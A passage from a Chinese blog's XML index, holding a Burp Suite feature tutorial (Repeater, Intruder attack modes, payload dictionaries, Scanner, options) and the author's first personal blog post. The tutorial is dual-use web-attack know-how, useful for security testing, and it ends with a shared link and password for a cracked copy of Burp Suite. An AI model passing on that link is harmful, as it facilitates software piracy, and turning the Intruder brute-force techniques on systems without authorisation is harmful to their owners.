中设置其他主机的IP与端口进行监听Redirect：请求处理，更改包的访问地址与端口。可以选择是否用ssl加密发送。当使用ssl时只有网站采用ssl的部分才能得到回应。invisible：代理的标准即设置了代理与未设置代理请求包的区别。certificate：证书。三个选项。下面是可以自己导入证书。 Repeater （老式步枪，一次一发）先通过proxy抓包，然后将包发送到repeater 可以通过重放修改包头信息。 repeater设置项在最上方，可设置更新长度，解压，如果对方选择跳转是否跟随。跟踪cookies，菜单栏。在右上角有一个target可以设置发送主机与端口。use HTTPS 是可以将http转换成https，如转至访问支付宝。** Intruder （冲锋枪，可连发）最上方设置项：开始攻击，打开保存过的攻击，保存攻击配置（保存payload配置），拷贝/下载攻击配置，new tab behavior 新建窗口（），自动攻击点，加载数据（可使用buit-in lists 也可以打开自己的攻击文本）options：（设置–攻击频率，修改数据）与repeater右上角target差不多。Targer（目标）： positions （攻击点，参数）Clear$：关掉所有标记的攻击点，选中想要攻击的参数选择add$，或者过长的参数选择开始点add然后在参数结尾再选择一次add。payload（攻击类型的选择即子弹选择）：1、sniper：狙击，对一个参数进行攻击 payload type，可以选择参数内容。对于每一个攻击点用存在的攻击内容依次抡一遍2、battering ram：对多个参数进行同一种攻击3、pitchfork：叉子模式，可自行设置攻击点的攻击内容。保证每个攻击点的payload数量相同，否则选用最少攻击次数4、cluster bomb：设置相似pitchfork，必须为每个攻击点设置payload，攻击次数是每个参数的payload相互组合发送攻击，次数最多 payload (攻击集合）payload sets 设置集合个数，即选择几个攻击点，type几种攻击类型=子弹种类：数字、simple list（内置的攻击行在payload option中选择如xss） 等等，也就是字典生成器runtime file 选择大型字典 numbers 数字字典，可用于order by、union联合查询、brute forcer 暴力破解，输入的字符按位数自动排列进行暴力破解）payload option 展示字典内容payload processing 对你的字典进行处理，强化字典。（增加内容add prefix/suffix 增加前后缀，match/replace替换字典中的某些字符，substring 当字典中每个字符串过长，可以截取字符串中某几个字符，reverse substring 截取中间几个字符倒一下顺序，modify case 大小写的转换，Encode 编码【常用】）payload encoding 为字典进行编码。等于 Encode 为快速选用而设计。 options (设置项)Request Headers：当服务器不支持长链接或者不想造成长链接可勾选 set connection：closeupdate content-length header： 计算包长度request engine：n（时间上的设置，频率）umber of threads 线程数number of retries on network failure 连接失败后 重新连接次数pause before retry（millisecond） 每个包之间的时间间隔throttle 发包时间设置，start time 点击开始攻击按钮后的启动时间，immediate 马上攻击in__ minutes 自己设置时间Attack results （攻击结果的记录）：store requests 从下请求，store respond 从下返回，make unmodifiedbaseline request 发送一次正常页面判断对方是否正常，使用dos攻击，压力测试，不记录返回结果。storefull payload 是否保存所有数据Grep-match：添加搜索值，打勾后若返回数据中存在预选值则会被划钩 ；case sensitive match 判断区分大小写是否敏感；exclude http headers 检索不包括包头中的数据Grep-extract：对上面检索的一个扩展，打开add 可以设置偏移量，能提取你想看的从某个位置到另一个位置中间的值。Grep-payloads：判断提交值 在返回值中是否存在提交的值–对XSS很重要；判断大小写是否敏感；不包括http头；编码URL Redirection 如果对放返回一个需要跳转的请求，设置是否跳转过去 Scanner (扫描模块)results：扫描结果，有漏洞描述，修复方式scan queue：扫描队列，扫描进程live scanning：正在进行的扫描，live active scanning 主动扫描，主动提交数据，然后根据返回值分析得出漏洞。passive scanning 分析在扫描历史中的数据。默认打开，options： 扫描设置 attack insertion points：URL参数更改，url，body，cookie三者的位置关系。可排除的攻击参数（缩小工作量），active scanning areas 动态扫描区域（采用payload类型）；passive scanning areas 静态扫描区域 Options (整体配置)misc : 其他hotkeys 设置快捷键；logging 日志（日志信息可以传给其他工具当做输入使用）；temporary files location 临时文件目录，自动备份。scheduled tasks 自己设置定时任务，如扫描，爬行等。display： user interface 字体大小与风格，Http Message display 对http 信息的数据的设置 character sets 编码，解码方式。html rendeing html渲染。connections 链接platform authentication 提供登录页面，当有账号与密码时可用用来爬取登录页面upstream proxy server 用外网某地址做代理。走http的socks proxy 走socks代理服务器timeout 整个软件的时间设置hostname resolution 以burp suite做一个dns服务器 用于本地host更改后转发数据。out_of_scope requests 处理没在域内的访问http 整个软件所有与http有关的选项都遵循这边的设置。redirections 是否跳转，哪些跳转streaming response 进行长连接，设置长时间的代理。自己加 status 100 response 处理100返回值当需要post一个大的数据包时会先发送一个100的问候，当服务端返回100后才开始发送大数据包。ssl–设置ssl属性client ssl certificate：当取得某网站证书，可在此处使用证书。当访问一个存在ssl加密的网址时将证书存放在server SSL certificate (证书列）中.ssl negotiation：进行协议的选择sessions：保存sessions信息 spider (爬虫)options： crawler setting 设置爬找哪些东西。form submission 自动匹配爬取到的数据。request headers 设置爬虫头。control 爬虫范围 总结burpsuite可以说是WEB测试必备神器之一，功能强大。其他介绍可以参考：http://www.nxadmin.com/tools/689.htmlhttps://portswigger.net/burp/download.html.. 另外，分享一个我手中最新破解版的burpsuit–1.7.08：http://pan.baidu.com/s/1dFsU0JR 密码：l3nl]]></content>
      <categories>
        <category>神器</category>
      </categories>
      <tags>
        <tag>Burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[太初]]></title>
    <url>%2F2016%2F10%2F08%2F1%2F</url>
    <content type="text"><![CDATA[开始不知道为啥，在写第一篇博文的时候突然想起小学老师教写日记的情景，几度春秋弹指即逝。。。。。。唯一不变的还是这么low~~~ 日常平常游荡在各位大佬，师傅，表哥的博客。在其中取经，学习，虽然没有评论，但是发自内心的佩服与感谢。在看完&lt;&lt;怎样花两年时间去面试一个人&gt;&gt;和Gabriel Weinberg的博文《Why I blog》之后，内心就萌发了创建个人博客的冲动，再加上平常笔记比较松散，不方便查阅，有时候遇到问题，解决后几天还有印象，但是时间一长，又忘了，也许下一次遇到同样的问题，又得浪费时间。想起黑客信条：世界充满了待解决的迷人问题。一个问题不应该被解决两次。无聊和乏味的工作是罪恶。自由万岁。态度不能替代能力。越发觉得自己也有必要按时整理笔记，并记录在博客中。于己于人都是一件长久有益的事情。这个博客在八月份就已经搭建并备案完毕，还是挺感谢清风和monburan的，还有黑鸟，建站经历网上很多人都总结出来了，我就不再累赘了。 愿景先把一些已经记录的笔记发出来，之后就整理学习过程中的收获与猥琐经验以及其他资源。希望能坚持下去，越走越远，，，，THE END –To follow the path: (沿着这样一条道路：)Look to the master, (寻找大师，)Follow the master, (跟随大师，)Walk with the master, (与大师通行，)See through the master, (洞察大师，)Become the master. (成为大师。)]]></content>
      <categories>
        <category>岁月</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
</search>
